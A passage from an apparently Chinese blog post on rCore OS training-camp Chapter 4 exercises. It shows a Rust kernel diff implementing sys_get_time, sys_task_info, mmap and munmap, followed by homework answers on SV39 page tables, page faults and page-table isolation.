break;</span><span class="token prefix inserted">+</span><span class="token line">            &#125;</span><span class="token prefix inserted">+</span><span class="token line">            idx += 1;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">        self.areas.remove(idx);</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    fn push(&amp;mut self, mut map_area: MapArea, data: Option&lt;&amp;[u8]>) &#123;</span><span class="token prefix unchanged"> </span><span class="token line">        map_area.map(&amp;mut self.page_table);</span><span class="token prefix unchanged"> </span><span class="token line">        if let Some(data) = data &#123;</span></span>diff --git a/os/src/mm/mod.rs b/os/src/mm/mod.rsindex 06f045c..8f21283 100644<span class="token coord">--- a/os/src/mm/mod.rs</span><span class="token coord">+++ b/os/src/mm/mod.rs</span>@@ -12,9 +12,9 @@ mod heap_allocator;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">mod memory_set;</span><span class="token prefix unchanged"> </span><span class="token line">mod page_table;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">pub use address::&#123;PhysAddr, PhysPageNum, VirtAddr, VirtPageNum&#125;;</span><span class="token prefix deleted">-</span><span class="token line">use address::&#123;StepByOne, VPNRange&#125;;</span><span class="token prefix deleted">-</span><span class="token line">pub use frame_allocator::&#123;frame_alloc, FrameTracker&#125;;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">pub use address::&#123;PhysAddr, PhysPageNum, VirtAddr, VirtPageNum, VPNRange&#125;;</span><span class="token prefix inserted">+</span><span class="token line">use address::StepByOne;</span><span class="token prefix inserted">+</span><span class="token line">pub use frame_allocator::&#123;frame_alloc, FrameTracker, is_mem_sufficient&#125;;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">pub use memory_set::remap_test;</span><span class="token prefix unchanged"> </span><span class="token line">pub use memory_set::&#123;kernel_stack_position, MapPermission, MemorySet, KERNEL_SPACE&#125;;</span><span class="token prefix unchanged"> </span><span class="token line">pub use page_table::&#123;translated_byte_buffer, PageTableEntry&#125;;</span></span>diff --git a/os/src/syscall/mod.rs b/os/src/syscall/mod.rsindex 4a5297d..129ed7f 100644<span class="token coord">--- a/os/src/syscall/mod.rs</span><span class="token coord">+++ b/os/src/syscall/mod.rs</span>@@ -30,8 +30,11 @@ mod process;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">use fs::*;</span><span class="token prefix unchanged"> </span><span class="token line">use process::*;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">use crate::task::inc_syscall_times;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">/// handle syscall exception with `syscall_id` and other arguments</span><span class="token prefix unchanged"> </span><span class="token line">pub fn syscall(syscall_id: usize, args: [usize; 3]) -> isize &#123;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    inc_syscall_times(syscall_id);</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    match syscall_id &#123;</span><span class="token prefix unchanged"> </span><span class="token line">        SYSCALL_WRITE => sys_write(args[0], args[1] as *const u8, args[2]),</span><span class="token prefix unchanged"> </span><span class="token line">        SYSCALL_EXIT => sys_exit(args[0] as i32),</span></span>diff --git a/os/src/syscall/process.rs b/os/src/syscall/process.rsindex e2f6662..e23a90c 100644<span class="token coord">--- a/os/src/syscall/process.rs</span><span class="token coord">+++ b/os/src/syscall/process.rs</span><span class="token coord">@@ -1,9 +1,11 @@</span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">//! Process management syscalls</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">use core::mem::size_of;</span><span class="token prefix inserted">+</span><span class="token line"></span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use crate::&#123;</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    config::MAX_SYSCALL_NUM,</span><span class="token prefix deleted">-</span><span class="token line">    task::&#123;</span><span class="token prefix deleted">-</span><span class="token line">        change_program_brk, exit_current_and_run_next, suspend_current_and_run_next, TaskStatus,</span><span class="token prefix deleted">-</span><span class="token line">    &#125;,</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    config::MAX_SYSCALL_NUM, mm::translated_byte_buffer, task::&#123;</span><span class="token prefix inserted">+</span><span class="token line">        change_program_brk, current_user_token, exit_current_and_run_next, get_scheduled_timespan, get_syscall_times, suspend_current_and_run_next, task_mmap, task_munmap, TaskStatus</span><span class="token prefix inserted">+</span><span class="token line">    &#125;, timer::get_time_us</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">#[repr(C)]</span></span>@@ -43,7 +45,21 @@ pub fn sys_yield() -> isize &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">/// HINT: What if [`TimeVal`] is splitted by two pages ?</span><span class="token prefix unchanged"> </span><span class="token line">pub fn sys_get_time(_ts: *mut TimeVal, _tz: usize) -> isize &#123;</span><span class="token prefix unchanged"> </span><span class="token line">    trace!("kernel: sys_get_time");</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    -1</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    let _us = get_time_us();</span><span class="token prefix inserted">+</span><span class="token line">    let time_val = TimeVal &#123;</span><span class="token prefix inserted">+</span><span class="token line">        sec: _us / 1_000_000,</span><span class="token prefix inserted">+</span><span class="token line">        usec: _us % 1_000_000,</span><span class="token prefix inserted">+</span><span class="token line">    &#125;;</span><span class="token prefix inserted">+</span><span class="token line">    let buffers = translated_byte_buffer(</span><span class="token prefix inserted">+</span><span class="token line">        current_user_token(), _ts as *const u8, size_of::&lt;TimeVal>());</span><span class="token prefix inserted">+</span><span class="token line">    let mut time_val_ptr = &amp;time_val as *const _ as *const u8;</span><span class="token prefix inserted">+</span><span class="token line">    for buffer in buffers &#123;</span><span class="token prefix inserted">+</span><span class="token line">        unsafe &#123;</span><span class="token prefix inserted">+</span><span class="token line">            time_val_ptr.copy_to(buffer.as_mut_ptr(), buffer.len());</span><span class="token prefix inserted">+</span><span class="token line">            time_val_ptr = time_val_ptr.add(buffer.len());</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    0</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">/// YOUR JOB: Finish sys_task_info to pass testcases</span></span>@@ -51,19 +67,33 @@ pub fn sys_get_time(_ts: *mut TimeVal, _tz: usize) -> isize &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">/// HINT: What if [`TaskInfo`] is splitted by two pages ?</span><span class="token prefix unchanged"> </span><span class="token line">pub fn sys_task_info(_ti: *mut TaskInfo) -> isize &#123;</span><span class="token prefix unchanged"> </span><span class="token line">    trace!("kernel: sys_task_info NOT IMPLEMENTED YET!");</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    -1</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    let task_info = TaskInfo &#123;</span><span class="token prefix inserted">+</span><span class="token line">        status: TaskStatus::Running,</span><span class="token prefix inserted">+</span><span class="token line">        syscall_times: get_syscall_times(),</span><span class="token prefix inserted">+</span><span class="token line">        time: get_scheduled_timespan(),</span><span class="token prefix inserted">+</span><span class="token line">    &#125;;</span><span class="token prefix inserted">+</span><span class="token line">    let buffers = translated_byte_buffer(</span><span class="token prefix inserted">+</span><span class="token line">        current_user_token(), _ti as *const u8, size_of::&lt;TaskInfo>());</span><span class="token prefix inserted">+</span><span class="token line">    let mut task_info_ptr = &amp;task_info as *const _ as *const u8;</span><span class="token prefix inserted">+</span><span class="token line">    for buffer in buffers &#123;</span><span class="token prefix inserted">+</span><span class="token line">        unsafe &#123;</span><span class="token prefix inserted">+</span><span class="token line">            task_info_ptr.copy_to(buffer.as_mut_ptr(), buffer.len());</span><span class="token prefix inserted">+</span><span class="token line">            task_info_ptr = task_info_ptr.add(buffer.len());</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    0</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// YOUR JOB: Implement mmap.</span><span class="token prefix unchanged"> </span><span class="token line">pub fn sys_mmap(_start: usize, _len: usize, _port: usize) -> isize &#123;</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    trace!("kernel: sys_mmap NOT IMPLEMENTED YET!");</span><span class="token prefix deleted">-</span><span class="token line">    -1</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    // trace!("kernel: sys_mmap NOT IMPLEMENTED YET!");</span><span class="token prefix inserted">+</span><span class="token line">    task_mmap(_start, _len, _port)</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// YOUR JOB: Implement munmap.</span><span class="token prefix unchanged"> </span><span class="token line">pub fn sys_munmap(_start: usize, _len: usize) -> isize &#123;</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    trace!("kernel: sys_munmap NOT IMPLEMENTED YET!");</span><span class="token prefix deleted">-</span><span class="token line">    -1</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    // trace!("kernel: sys_munmap NOT IMPLEMENTED YET!");</span><span class="token prefix inserted">+</span><span class="token line">    task_munmap(_start, _len)</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line">/// change data segment size</span><span class="token prefix unchanged"> </span><span class="token line">pub fn sys_sbrk(size: i32) -> isize &#123;</span></span>diff --git a/os/src/task/mod.rs b/os/src/task/mod.rsindex a745df8..460b23b 100644<span class="token coord">--- a/os/src/task/mod.rs</span><span class="token coord">+++ b/os/src/task/mod.rs</span>@@ -14,8 +14,11 @@ mod switch;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">#[allow(clippy::module_inception)]</span><span class="token prefix unchanged"> </span><span class="token line">mod task;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">use crate::config::MAX_SYSCALL_NUM;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use crate::loader::&#123;get_app_data, get_num_app&#125;;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">use crate::mm::&#123;is_mem_sufficient, MapPermission, VPNRange, VirtAddr, VirtPageNum&#125;;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use crate::sync::UPSafeCell;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">use crate::timer::get_time_ms;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use crate::trap::TrapContext;</span><span class="token prefix unchanged"> </span><span class="token line">use alloc::vec::Vec;</span><span class="token prefix unchanged"> </span><span class="token line">use lazy_static::*;</span></span>@@ -140,6 +143,11 @@ impl TaskManager &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">            let mut inner = self.inner.exclusive_access();</span><span class="token prefix unchanged"> </span><span class="token line">            let current = inner.current_task;</span><span class="token prefix unchanged"> </span><span class="token line">            inner.tasks[next].task_status = TaskStatus::Running;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">            // if the task is being called for the first time,</span><span class="token prefix inserted">+</span><span class="token line">            if inner.tasks[next].time == 0usize &#123;</span><span class="token prefix inserted">+</span><span class="token line">                // then set it to the current time</span><span class="token prefix inserted">+</span><span class="token line">                inner.tasks[next].time = get_time_ms();</span><span class="token prefix inserted">+</span><span class="token line">            &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">            inner.current_task = next;</span><span class="token prefix unchanged"> </span><span class="token line">            let current_task_cx_ptr = &amp;mut inner.tasks[current].task_cx as *mut TaskContext;</span><span class="token prefix unchanged"> </span><span class="token line">            let next_task_cx_ptr = &amp;inner.tasks[next].task_cx as *const TaskContext;</span></span>@@ -153,6 +161,80 @@ impl TaskManager &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">            panic!("All applications completed!");</span><span class="token prefix unchanged"> </span><span class="token line">        &#125;</span><span class="token prefix unchanged"> </span><span class="token line">    &#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    /// Get task's syscall times</span><span class="token prefix inserted">+</span><span class="token line">    pub fn get_syscall_times(&amp;self) -> [u32; MAX_SYSCALL_NUM] &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let inner = self.inner.exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">        let current = inner.current_task;</span><span class="token prefix inserted">+</span><span class="token line">        inner.tasks[current].syscall_times.clone()</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    /// Get task's time span between current time and first scheduled time</span><span class="token prefix inserted">+</span><span class="token line">    pub fn get_scheduled_timespan(&amp;self) -> usize &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let inner = self.inner.exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">        let current = inner.current_task;</span><span class="token prefix inserted">+</span><span class="token line">        get_time_ms() - inner.tasks[current].time</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    /// Increase syscall times</span><span class="token prefix inserted">+</span><span class="token line">    pub fn inc_syscall_times(&amp;self, syscall_id: usize) -> bool &#123;</span><span class="token prefix inserted">+</span><span class="token line">        if syscall_id >= MAX_SYSCALL_NUM &#123;</span><span class="token prefix inserted">+</span><span class="token line">            return false;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">        let mut inner = self.inner.exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">        let current = inner.current_task;</span><span class="token prefix inserted">+</span><span class="token line">        inner.tasks[current].syscall_times[syscall_id] += 1;</span><span class="token prefix inserted">+</span><span class="token line">        true</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    /// Map some pages to memory_set</span><span class="token prefix inserted">+</span><span class="token line">    fn mmap(&amp;self, start_va: VirtAddr, end_va: VirtAddr, port: usize) -> isize &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let mut inner = self.inner.exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">        let cur = inner.current_task;</span><span class="token prefix inserted">+</span><span class="token line">        let vpn_range = VPNRange::new(</span><span class="token prefix inserted">+</span><span class="token line">            VirtPageNum::from(start_va),</span><span class="token prefix inserted">+</span><span class="token line">            end_va.ceil()</span><span class="token prefix inserted">+</span><span class="token line">        );</span><span class="token prefix inserted">+</span><span class="token line">        </span><span class="token prefix inserted">+</span><span class="token line">        // 3. Check if trying to map mapped page</span><span class="token prefix inserted">+</span><span class="token line">        for vpn in vpn_range &#123;</span><span class="token prefix inserted">+</span><span class="token line">            if let Some(pte) = inner.tasks[cur].memory_set.translate(vpn) &#123;</span><span class="token prefix inserted">+</span><span class="token line">                if pte.is_valid() &#123;</span><span class="token prefix inserted">+</span><span class="token line">                    return -1;</span><span class="token prefix inserted">+</span><span class="token line">                &#125;</span><span class="token prefix inserted">+</span><span class="token line">            &#125;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">        // After checking all errors may occur,</span><span class="token prefix inserted">+</span><span class="token line">        // push a new map_area to current memory_set</span><span class="token prefix inserted">+</span><span class="token line">        let perm = MapPermission::from_bits((port as u8) &lt;&lt; 1).unwrap() | MapPermission::U;</span><span class="token prefix inserted">+</span><span class="token line">        inner.tasks[cur].memory_set.insert_framed_area(start_va, end_va, perm);</span><span class="token prefix inserted">+</span><span class="token line">        0</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    /// Unmap some pages in memory set</span><span class="token prefix inserted">+</span><span class="token line">    fn munmap(&amp;self, start_va: VirtAddr, end_va: VirtAddr) -> isize &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let mut inner = self.inner.exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">        let cur = inner.current_task;</span><span class="token prefix inserted">+</span><span class="token line">        let vpn_range = VPNRange::new(</span><span class="token prefix inserted">+</span><span class="token line">            VirtPageNum::from(start_va),</span><span class="token prefix inserted">+</span><span class="token line">            end_va.ceil(),</span><span class="token prefix inserted">+</span><span class="token line">        );</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">        // 1. Check if trying to unmap unmapped page</span><span class="token prefix inserted">+</span><span class="token line">        for vpn in vpn_range &#123;</span><span class="token prefix inserted">+</span><span class="token line">            if let Some(pte) = inner.tasks[cur].memory_set.translate(vpn) &#123;</span><span class="token prefix inserted">+</span><span class="token line">                if !pte.is_valid() &#123;</span><span class="token prefix inserted">+</span><span class="token line">                    return -1</span><span class="token prefix inserted">+</span><span class="token line">                &#125;</span><span class="token prefix inserted">+</span><span class="token line">            &#125;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">        // After checking all errors may occur,</span><span class="token prefix inserted">+</span><span class="token line">        // remove some pages from current memory_set</span><span class="token prefix inserted">+</span><span class="token line">        inner.tasks[cur].memory_set.remove_framed_area(vpn_range);</span><span class="token prefix inserted">+</span><span class="token line">        0</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">/// Run the first task in task list.</span></span>@@ -202,3 +284,46 @@ pub fn current_trap_cx() -> &amp;'static mut TrapContext &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">pub fn change_program_brk(size: i32) -> Option&lt;usize> &#123;</span><span class="token prefix unchanged"> </span><span class="token line">    TASK_MANAGER.change_current_program_brk(size)</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">/// Get current task's syscall times</span><span class="token prefix inserted">+</span><span class="token line">pub fn get_syscall_times() -> [u32; MAX_SYSCALL_NUM] &#123;</span><span class="token prefix inserted">+</span><span class="token line">    TASK_MANAGER.get_syscall_times()</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">/// Get current task's time span between current time and first scheduled time</span><span class="token prefix inserted">+</span><span class="token line">pub fn get_scheduled_timespan() -> usize &#123;</span><span class="token prefix inserted">+</span><span class="token line">    TASK_MANAGER.get_scheduled_timespan()</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">/// Increase current task's syscall times</span><span class="token prefix inserted">+</span><span class="token line">pub fn inc_syscall_times(syscall_id: usize) -> bool &#123;</span><span class="token prefix inserted">+</span><span class="token line">    TASK_MANAGER.inc_syscall_times(syscall_id)</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">/// Map some pages to current task's memory_set</span><span class="token prefix inserted">+</span><span class="token line">pub fn task_mmap(start: usize, len: usize, port: usize) -> isize &#123;</span><span class="token prefix inserted">+</span><span class="token line">    let start_va = VirtAddr::from(start);</span><span class="token prefix inserted">+</span><span class="token line">    // 1. illegal start virtual address or port</span><span class="token prefix inserted">+</span><span class="token line">    if !start_va.aligned() || port &amp; !0x7 != 0 || port &amp; 0x7 == 0 &#123;</span><span class="token prefix inserted">+</span><span class="token line">        return -1;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    // 2. Check is there sufficient physical memory</span><span class="token prefix inserted">+</span><span class="token line">    if !is_mem_sufficient(len) &#123;</span><span class="token prefix inserted">+</span><span class="token line">        return -1;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    </span><span class="token prefix inserted">+</span><span class="token line">    let end_va = VirtAddr::from(start + len);</span><span class="token prefix inserted">+</span><span class="token line">    TASK_MANAGER.mmap(start_va, end_va, port)</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">/// Unmap some pages in current task's memory set</span><span class="token prefix inserted">+</span><span class="token line">pub fn task_munmap(start: usize, len: usize) -> isize &#123;</span><span class="token prefix inserted">+</span><span class="token line">    let start_va = VirtAddr::from(start);</span><span class="token prefix inserted">+</span><span class="token line">    if !start_va.aligned() &#123;</span><span class="token prefix inserted">+</span><span class="token line">        return -1;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    </span><span class="token prefix inserted">+</span><span class="token line">    let end_va = VirtAddr::from(start + len);</span><span class="token prefix inserted">+</span><span class="token line">    TASK_MANAGER.munmap(start_va, end_va)</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span></span>\ No newline at end of filediff --git a/os/src/task/task.rs b/os/src/task/task.rsindex dce6981..396342d 100644<span class="token coord">--- a/os/src/task/task.rs</span><span class="token coord">+++ b/os/src/task/task.rs</span><span class="token coord">@@ -1,6 +1,6 @@</span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">//! Types related to task management</span><span class="token prefix unchanged"> </span><span class="token line">use super::TaskContext;</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">use crate::config::TRAP_CONTEXT_BASE;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">use crate::config::&#123;MAX_SYSCALL_NUM, TRAP_CONTEXT_BASE&#125;;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use crate::mm::&#123;</span><span class="token prefix unchanged"> </span><span class="token line">    kernel_stack_position, MapPermission, MemorySet, PhysPageNum, VirtAddr, KERNEL_SPACE,</span><span class="token prefix unchanged"> </span><span class="token line">&#125;;</span></span>@@ -28,6 +28,12 @@ pub struct TaskControlBlock &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">    /// Program break</span><span class="token prefix unchanged"> </span><span class="token line">    pub program_brk: usize,</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    /// The syscall times</span><span class="token prefix inserted">+</span><span class="token line">    pub syscall_times: [u32; MAX_SYSCALL_NUM],</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    /// The first time the task was scheduled</span><span class="token prefix inserted">+</span><span class="token line">    pub time: usize,</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">impl TaskControlBlock &#123;</span></span>@@ -63,6 +69,8 @@ impl TaskControlBlock &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">            base_size: user_sp,</span><span class="token prefix unchanged"> </span><span class="token line">            heap_bottom: user_sp,</span><span class="token prefix unchanged"> </span><span class="token line">            program_brk: user_sp,</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">            syscall_times: [0u32; MAX_SYSCALL_NUM],</span><span class="token prefix inserted">+</span><span class="token line">            time: 0usize,</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        &#125;;</span><span class="token prefix unchanged"> </span><span class="token line">        // prepare TrapContext in user space</span><span class="token prefix unchanged"> </span><span class="token line">        let trap_cx = task_control_block.get_trap_cx();</span></span></code></pre><h1 id="问答作业"><a href="#问答作业" class="headerlink" title="问答作业"></a>问答作业</h1><h2 id="t1"><a href="#t1" class="headerlink" title="t1"></a>t1</h2><p><strong>Q:</strong> 请列举 SV39 页表页表项的组成，描述其中的标志位有何作用？</p><p><strong>A:</strong> </p><p><img src="/2024/11/01/2024%E5%BC%80%E6%BA%90%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AE%AD%E7%BB%83%E8%90%A5-rCore-Chapter4%E7%BB%83%E4%B9%A0/pte.png" alt></p><p>上图为 SV39 分页模式下的页表项，其中 <code>[53:10]</code> 这 44 位是物理页号，最低的 8 位 <code>[7:0]</code> 则是标志位，它们的含义如下：</p><ul><li>仅当 V(Valid) 位为 1 时，页表项才是合法的；</li><li>R/W/X 分别控制索引到这个页表项的对应虚拟页面是否允许读/写/取指；</li><li>U 控制索引到这个页表项的对应虚拟页面是否在 CPU 处于 U 特权级的情况下是否被允许访问；</li><li>G 代表全局属性，当 G 被设置为 1 时，表示该页表项所描述的页面是全局共享的；</li><li>A(Accessed) 记录自从页表项上的这一位被清零之后，页表项的对应虚拟页面是否被访问过；</li><li>D(Dirty) 则记录自从页表项上的这一位被清零之后，页表项的对应虚拟页表是否被修改过。</li></ul><h2 id="t2"><a href="#t2" class="headerlink" title="t2"></a>t2</h2><p>缺页指的是进程访问页面时页面不在页表中或在页表中无效的现象，此时 MMU 将会返回一个中断， 告知 os 进程内存访问出了问题。os 选择填补页表并重新执行异常指令或者杀死进程。</p><p><strong>Q1:</strong> 请问哪些异常可能是缺页导致的？</p><p><strong>A1:</strong> 进程访问未映射的内存页面、访问已被换出到磁盘的页面、进程尝试以不正确的权限访问页面（例如写入只读页面）。</p><p><strong>Q2:</strong> 发生缺页时，描述相关重要寄存器的值，上次实验描述过的可以简略。</p><p><strong>A2:</strong> 以下是与缺页相关的 CSR 寄存器的值：</p><ul><li><code>scause</code>: 记录导致异常的原因。对于缺页异常，该寄存器的值包含异常的类型和特定的错误代码，指示发生了缺页异常。</li><li><code>sstatus</code>: 记录处理器当前状态，其中 SPP 段记录当前特权等级。</li><li><code>sepc</code>: 当缺页异常发生时，<code>sepc</code> 会保存出错指令的地址，以便在异常处理完成后能够返回到该指令重新执行。</li><li><code>stval</code>: 在缺页异常情况下，<code>stval</code> 会存储导致缺页的虚拟地址，帮助操作系统确定是哪个页面缺失。</li></ul><p>缺页有两个常见的原因，其一是 Lazy 策略，也就是直到内存页面被访问才实际进行页表操作。 比如，一个程序被执行时，进程的代码段理论上需要从磁盘加载到内存。但是 os 并不会马上这样做， 而是会保存 <code>.text</code> 段在磁盘的位置信息，在这些代码第一次被执行时才完成从磁盘的加载操作。</p><p><strong>Q3:</strong> 这样做有哪些好处？</p><p><strong>A3:</strong> 只在需要时加载页面，避免不必要的内存占用，允许系统将更多进程同时驻留在内存中；程序在启动时不必立即加载所有代码和数据，从而减少初始加载时间。</p><p>其实，我们的 mmap 也可以采取 Lazy 策略，比如：一个用户进程先后申请了 10G 的内存空间， 然后用了其中 1M 就直接退出了。按照现在的做法，我们显然亏大了，进行了很多没有意义的页表操作。</p><p><strong>Q4:</strong> 处理 10G 连续的内存页面，对应的 SV39 页表大致占用多少内存 (估算数量级即可)？</p><p><strong>A4:</strong> 略。</p><p><strong>Q5:</strong> 请简单思考如何才能实现 Lazy 策略，缺页时又如何处理？描述合理即可，不需要考虑实现。</p><p><strong>A5:</strong> 加载程序时并不真正将代码段加载到内存，将页表项的有效位设置为 0，访问该代码段时会触发缺页异常，进入内核后得知异常原因是访问 Lazy 页面，随后进行异常处理：将页面从磁盘加载入内存，随后返回用户态重新执行。</p><p>缺页的另一个常见原因是 swap 策略，也就是内存页面可能被换到磁盘上了，导致对应页面失效。</p><p><strong>Q6:</strong> 此时页面失效如何表现在页表项(PTE)上？</p><p><strong>A6:</strong> 有效位为 0.</p><h2 id="t3"><a href="#t3" class="headerlink" title="t3"></a>t3</h2><p>为了防范侧信道攻击，我们的 os 使用了双页表。但是传统的设计一直是单页表的，也就是说， 用户线程和对应的内核线程共用同一张页表，只不过内核对应的地址只允许在内核态访问。 (备注：这里的单/双的说法仅为自创的通俗说法，并无这个名词概念，详情见 <a href="https://en.wikipedia.org/wiki/Kernel_page-table_isolation">KPTI</a> )</p><p><strong>Q1:</strong> 在单页表情况下，如何更换页表？</p><p><strong>A1:</strong> 无需更换，通过标志位进行控制，可能需要将 TLB 清空。</p><p><strong>Q2:</strong> 